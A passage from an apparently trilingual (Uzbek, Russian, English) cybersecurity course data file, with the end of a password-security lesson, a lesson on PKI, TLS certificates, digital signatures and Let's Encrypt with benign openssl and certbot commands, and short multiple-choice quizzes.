<p><strong>Credential Stuffing:</strong> Stolen passwords tried on other sites</p>
</div>
<h3>⏱️ Cracking time (modern GPU)</h3>
<pre><code>password       < 1 second
P@ssw0rd!      2 hours
P@ssw0rd!23    3 days
Tr0ub4d0r&3    10 years
My_Home_2024!  Centuries!</code></pre>`
        },
        quiz:[
          { q:{uz:"Rainbow Table hujumidan himoya qiluvchi yaxshiroq usul?",ru:"Что лучше всего защищает от Rainbow Table атаки?",en:"What best protects against Rainbow Table attacks?"},
            options:{uz:["Uzun parol","Salt (tuz) qo'shish","Katta harflar ishlatish","Raqam qo'shish"],ru:["Длинный пароль","Добавление соли (salt)","Использование заглавных букв","Добавление цифр"],en:["Long password","Adding salt","Using uppercase","Adding numbers"]}, answer:1 },
          { q:{uz:"Credential Stuffing nima?",ru:"Что такое Credential Stuffing?",en:"What is Credential Stuffing?"},
            options:{uz:["Parolni taxmin qilish","O'g'irlangan parollar bilan boshqa saytlarga kirish","Brute force hujumi","Phishing"],ru:["Угадывание пароля","Использование украденных паролей на других сайтах","Атака brute force","Фишинг"],en:["Guessing passwords","Using stolen passwords on other sites","Brute force attack","Phishing"]}, answer:1 }
        ]
      },
      {
        id:"c2w8l3",
        title:{ uz:"PKI, SSL/TLS va Raqamli Imzolar", ru:"PKI, SSL/TLS и цифровые подписи", en:"PKI, SSL/TLS and digital signatures" },
        duration:"30 daq",
        content:{
          uz:`<h2>PKI, SSL/TLS va Raqamli Imzolar</h2>
<h3>🏛️ PKI — Public Key Infrastructure</h3>
<p>PKI — ochiq kalitlarning ishonchliligini ta'minlaydigan tizim. "Bu ochiq kalit haqiqatan ham bank.uz ga tegishli" ni qanday bilamiz?</p>
<div class="info-box">
<p><strong>CA (Certificate Authority):</strong> Sertifikatlarni tasdiqlaydigan ishonchli tashkilot.<br>Misol: DigiCert, Let's Encrypt, GlobalSign</p>
<p><strong>Sertifikat:</strong> Kalit + egalik ma'lumoti + CA imzosi</p>
<p><strong>Chain of Trust:</strong> Root CA → Intermediate CA → Sayt sertifikati</p>
</div>
<h3>🔍 Sertifikatni tekshirish</h3>
<pre><code># OpenSSL bilan:
openssl s_client -connect bank.uz:443

# Natijada ko'rasiz:
Certificate chain
 0 s:CN = bank.uz
   i:CN = DigiCert TLS RSA SHA256 2020 CA1
 1 s:CN = DigiCert TLS RSA SHA256 2020 CA1
   i:CN = DigiCert Global Root CA

# Sertifikat ma'lumotlari:
openssl s_client -connect bank.uz:443 | openssl x509 -text</code></pre>
<h3>✍️ Raqamli Imzo</h3>
<pre><code># Raqamli imzo qanday ishlaydi:
1. Hujjat → SHA-256 hash → "abc123..."
2. Hash → yopiq kalit bilan shifrlanadi → Imzo
3. Imzo + Hujjat → yuboriladi

# Qabul qiluvchi tekshiradi:
1. Imzo → ochiq kalit bilan ochiladi → "abc123..."
2. Hujjat → SHA-256 → "abc123..."
3. Ikkalasi mos? → Imzo to'g'ri va o'zgartirilmagan!

# Foydalanish:
- Email imzolash (S/MIME, PGP)
- Kod imzolash (Windows driver, APK)
- PDF hujjatlar
- Blockchain tranzaksiyalar</code></pre>
<h3>🔐 Let's Encrypt — Bepul SSL</h3>
<pre><code># Saytingizga bepul SSL sertifikat:
apt install certbot python3-certbot-nginx

certbot --nginx -d mysite.uz

# Sertifikat 90 kunda yangilanadi — auto renewal:
certbot renew --dry-run</code></pre>
<h3>📋 2-oy to'liq yakunlash</h3>
<div class="info-box">
<p>Tabriklaymiz! 2 oyda siz web xavfsizlik va tarmoq asoslarini o'rgandingiz. Endi <strong>3-oy</strong> — professional penetratsion test bosqichi boshlanadi!</p>
</div>`,
          ru:`<h2>PKI, SSL/TLS и цифровые подписи</h2>
<h3>🏛️ PKI — Инфраструктура открытых ключей</h3>
<div class="info-box">
<p><strong>CA (Certificate Authority):</strong> Доверенная организация, выдающая сертификаты. Пример: DigiCert, Let's Encrypt</p>
<p><strong>Цепочка доверия:</strong> Root CA → Intermediate CA → Сертификат сайта</p>
</div>
<pre><code># OpenSSL проверка:
openssl s_client -connect bank.ru:443

# Бесплатный SSL (Let's Encrypt):
certbot --nginx -d mysite.ru
certbot renew --dry-run   # автообновление</code></pre>
<h3>✍️ Цифровая подпись</h3>
<pre><code># Как работает:
1. Документ → SHA-256 → "abc123..."
2. Хеш + приватный ключ → Подпись
3. Получатель: Подпись + публичный ключ → проверка хеша</code></pre>`,
          en:`<h2>PKI, SSL/TLS and digital signatures</h2>
<h3>🏛️ PKI — Public Key Infrastructure</h3>
<div class="info-box">
<p><strong>CA (Certificate Authority):</strong> Trusted org that issues certificates. Examples: DigiCert, Let's Encrypt</p>
<p><strong>Chain of Trust:</strong> Root CA → Intermediate CA → Site certificate</p>
</div>
<pre><code># OpenSSL check:
openssl s_client -connect bank.com:443

# Free SSL (Let's Encrypt):
certbot --nginx -d mysite.com
certbot renew --dry-run   # auto-renewal</code></pre>
<h3>✍️ Digital Signature</h3>
<pre><code># How it works:
1. Document → SHA-256 → "abc123..."
2. Hash + private key → Signature
3. Receiver: Signature + public key → verify hash</code></pre>`
        },
        quiz:[
          { q:{uz:"Let's Encrypt nima?",ru:"Что такое Let's Encrypt?",en:"What is Let's Encrypt?"},
            options:{uz:["Parol menejeri","Bepul SSL sertifikat beruvchi CA","VPN xizmati","Antivirus"],ru:["Менеджер паролей","Бесплатный CA для SSL сертификатов","VPN сервис","Антивирус"],en:["Password manager","Free CA for SSL certificates","VPN service","Antivirus"]}, answer:1 },
          { q:{uz:"Raqamli imzo qanday muammoni hal qiladi?",ru:"Какую проблему решает цифровая подпись?",en:"What problem does a digital signature solve?"},
            options:{uz:["Ma'lumotni shifrlaydi","Hujjat muallifi va o'zgartirilmaganligini tasdiqlaydi","Tezlikni oshiradi","Parolni saqlaydi"],ru:["Шифрует данные","Подтверждает автора и неизменность документа","Увеличивает скорость","Хранит пароль"],en:["Encrypts data","Confirms authorship and document integrity","Increases speed","Stores password"]}, answer:1 }
        ]
      }
    ]
  }
];
